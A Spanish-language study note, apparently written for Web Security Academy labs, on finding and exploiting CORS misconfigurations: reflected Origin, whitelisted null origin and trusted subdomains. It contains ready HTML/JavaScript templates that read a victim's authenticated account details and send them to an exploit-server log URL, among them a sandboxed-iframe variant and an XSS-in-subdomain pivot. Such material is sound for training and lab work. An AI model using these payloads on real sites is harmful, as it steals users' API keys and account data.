---
aliases:
  - CORS
  - cors-entrypoint
  - Cross-Origin Resource Sharing
  - origin reflection
  - null origin
tags:
  - vuln/cors
  - entrypoint
---

# CORS — Punto de entrada

> Documento **agnóstico al negocio**: *cómo **detectar y explotar** una mala config de CORS*.
> **Dónde** aplica (qué endpoint devuelve los datos jugosos) → eso vive en los `STAGE_x`.

> [!abstract] La idea en una línea
> CORS **relaja** la Same-Origin Policy: le dice al navegador *"esta respuesta la puede **leer** este otro origen"*. Si el server **confía en el origen equivocado** (refleja el tuyo, o confía en `null`/subdominios), montás una página atacante que hace `fetch` **con la sesión de la víctima** y **te lleva la respuesta** (API key, datos de la cuenta).

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 3 labs (2 Apprentice + 1 Practitioner), qué objetivo tiene cada uno y cómo se arma: [labs/README.md](labs/README.md)
- 🐍 **Ejemplos / PoCs listas** (para el exploit server): [[vulnerabilities/005-cors/examples/robar-apikey-origin-reflejado|robar API key con Origin reflejado]] · [[vulnerabilities/005-cors/examples/bypass-origin-null|bypass Origin null]] · [[vulnerabilities/005-cors/examples/pivot-subdominio-http-via-xss|pivot subdominio HTTP vía XSS]]
- 🧰 **Método de entrega:** **exploit server** con un `<script>`/`<iframe>` que hace el `fetch` con `credentials:'include'`. La víctima/admin lo visita → su navegador manda **sus cookies** al target.
- 🔗 **No confundir con CSRF:** CORS te deja **LEER** la respuesta cross-origin (exfiltrar datos); CSRF solo te deja **ESCRIBIR** (disparar una acción a ciegas). CORS **no** protege contra CSRF → [[vulnerabilities/003-csrf/README|CSRF]].
- 🔗 Se combina con **XSS en un subdominio** (para explotar la confianza en subdominios) → [[vulnerabilities/002-xss/README|XSS]].

## 🎯 Condiciones para que exista (la FLAG real)

Para **robar datos autenticados** (la API key del admin, su `/my-account`) se tienen que cumplir **las tres** cosas:

1. **`Access-Control-Allow-Credentials: true`** en la respuesta → el server acepta que el navegador mande **cookies** cross-origin. Sin esto, el `fetch` con `credentials:'include'` no expone la respuesta. **Es necesario** para robar cualquier cosa detrás de sesión.
2. **`Access-Control-Allow-Origin` (ACAO) confía en un origen que vos controlás.** Casos:
   - **Refleja tu `Origin` arbitrario** → mandás `Origin: https://evil.com` y la respuesta trae `Access-Control-Allow-Origin: https://evil.com`. **Este es el bug de "reflejo".**
   - **Confía en `Origin: null`** → generás un origen `null` (iframe *sandboxed*, `data:`, redirect) y lo refleja.
   - **Confía en subdominios** (incluso por HTTP) → si controlás un subdominio (XSS/HTTP) atacás desde ahí.
3. **Tu JS manda `fetch(..., {credentials:'include'})`** (equivalente viejo: `req.withCredentials = true`) para que viajen las cookies de la víctima.

> [!danger] 🚩 El caso de `ACAO: *` — por qué NO sirve para robar la sesión
> Confirmando tu intuición: **sí, `Access-Control-Allow-Origin: *` es "el otro caso"**, pero es **inofensivo para datos autenticados**. La spec **prohíbe** `*` junto con credenciales: si ACAO es `*`, el navegador **bloquea** cualquier respuesta que use `credentials:'include'`. Por eso:
> - **`ACAO: *`** → solo podés leer datos **públicos / sin sesión** (o recursos de intranet sin credenciales). **No** te da la API key del admin.
> - **Robar sesión** → necesitás **ACAO = tu origen específico (reflejado) o `null`** + **`Allow-Credentials: true`**. El `*` **no** convive con `Allow-Credentials: true`.
>
> Regla: **`*` sin credenciales = data pública. Reflejo/`null` + `Allow-Credentials: true` = robo de cuenta.**

## 🧪 Cómo cazarlo (metodología)

1. **Buscá la request que trae los datos jugosos:** típicamente un **AJAX** a `/accountDetails`, `/my-account`, `/api/...` cuya respuesta trae `apiKey`, `email`, etc.
2. **Mirá los headers de respuesta:** ¿aparece `Access-Control-Allow-Credentials: true`? Es la pista de que soporta CORS.
3. **Probá en Repeater** agregando a la request un header **`Origin: https://evil.com`** (o `Origin: null`, o `Origin: http://sub.lab-id`):
   - Si la respuesta refleja tu origen en **`Access-Control-Allow-Origin`** → **vulnerable**.
4. **Confirmá el par:** que además esté `Access-Control-Allow-Credentials: true` (si querés datos con sesión).
5. **Weaponizá** en el exploit server (plantillas abajo) y **entregá** a la víctima. Confirmá por **Access log**.

> [!note] 🚚 ¿Requiere enviar exploit? — SÍ (salvo intranet)
> El `fetch` tiene que salir **desde el navegador de la víctima** para que viajen **sus cookies**. Por eso subís el HTML al **exploit server** y usás **"Deliver exploit to victim"**. Tu propio navegador solo sirve para **probar el PoC** (te robás a vos mismo). El **objetivo** es el mismo que un XSS de robo: exfiltrar la **API key / datos de sesión** del admin → completar la cuenta / leer el secreto.

---

## 🧩 Los 3 sabores (según en qué confía el server)

### 1) Reflejo del `Origin` (trusts all origins)
El server toma tu header `Origin` y lo **devuelve tal cual** en `Access-Control-Allow-Origin`, con `Allow-Credentials: true`. **El más directo:** un `<script>` en el exploit server con un `fetch(..., {credentials:'include'})` a `/accountDetails`.

### 2) `Origin: null` whitelisteado
Algunos devs whitelistean `null` (creyendo que es "seguro" para requests locales/sandbox). Vos **generás** un origen `null` y lo explotás. Formas de conseguir `null` (de las notas previas, todas válidas):
- **Iframe *sandboxed*** (`sandbox="allow-scripts allow-forms"` → sin `allow-same-origin`) con `srcdoc`. ← el del lab.
- **Cross-origin redirect** (302 a través de un salto).
- **Request desde `data:` URL** (`data:text/html,<script>…`).
- **Request desde `file:`** protocol (puede ir en base64).

> [!warning] Repeater ≠ exploit real
> En **Repeater** "forzás" `null` escribiendo el header `Origin: null` a mano (sirve para **confirmar**). En un **exploit real** el `Origin` lo pone el navegador de la víctima: tenés que hacer que la request **nazca** de un contexto sin origen (sandbox/`data:`/`file:`/redirect). PoC completa con las 4 formas → [[vulnerabilities/005-cors/examples/bypass-origin-null|ejemplo: bypass Origin null]].

### 3) Subdominios / protocolos inseguros (trusts all subdomains)
El server confía en **cualquier subdominio, incluso por HTTP**. No podés MITM en el lab, así que necesitás **inyectar JS en un subdominio confiable** → un **XSS en un subdominio** (p. ej. `stock.target` con `productId` reflejado). Desde ese origen confiable, el `fetch` a la API pasa el chequeo de CORS.

> [!tip] CORS ⇄ XSS
> Un **XSS** en un subdominio confiable **convierte** una CORS "confía en subdominios" en robo total: ejecutás tu JS desde un origen que el server acepta. Y al revés: si un endpoint confía en tu origen por CORS, podés **leer** su respuesta (algo que un XSS clásico ya podía, pero acá **sin** XSS en el dominio principal).

---

## 🐍 Plantillas (reemplazá lo <mark>resaltado</mark>)

**1) Reflejo de Origin (trusts all origins) — robar la respuesta autenticada** → [[vulnerabilities/005-cors/examples/robar-apikey-origin-reflejado|ejemplo completo]]
```html
<script>
fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
  .then(r => r.text())
  .then(d => location = 'https://EXPLOIT.exploit-server.net/log?key=' + encodeURIComponent(d));
</script>
```

**2) `Origin: null` — iframe sandboxed genera el origen `null`** → [[vulnerabilities/005-cors/examples/bypass-origin-null|ejemplo completo]]
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
      .then(r => r.text())
      .then(d => location = 'https://EXPLOIT.exploit-server.net/log?key=' + encodeURIComponent(d));
</script>"></iframe>
```

**3) Trusts subdomains → XSS en subdominio HTTP como trampolín** → [[vulnerabilities/005-cors/examples/pivot-subdominio-http-via-xss|ejemplo completo]]
```html
<script>
document.location="http://stock.TARGET.web-security-academy.net/?productId=4<script>fetch('https://TARGET.web-security-academy.net/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://EXPLOIT.exploit-server.net/log?key='%2bencodeURIComponent(d))%3c/script>&storeId=1"
</script>
```

**Detección rápida en Repeater** (header a agregar a la request de datos):
```
Origin: https://evil.com
```
→ si vuelve `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → 🎯.

---

## 🌐 Curiosidad — CORS sin credenciales / intranet

Aunque no puedas robar sesión (`ACAO: *`, sin credenciales), una página atacante puede usar `fetch` para **escanear la red interna** de la víctima y **leer recursos internos** que confíen en `*` (dashboards, APIs sin auth accesibles solo desde la LAN de la víctima). Es el caso "Intranets and CORS without credentials". Impacto: acceso a recursos internos, no robo de cuenta.

> [!note] Relación con otras vulns
> - **CSRF** — CORS **no** lo previene; y si el endpoint solo permite **escribir**, es CSRF, no CORS → [[vulnerabilities/003-csrf/README|CSRF]].
> - **XSS** — un XSS en subdominio habilita el sabor "trusts subdomains" → [[vulnerabilities/002-xss/README|XSS]].
> - Todo se **entrega por exploit server** → misma mecánica de víctima que XSS entregado / clickjacking / [[vulnerabilities/025-dom-based/dom-based|DOM-based]].
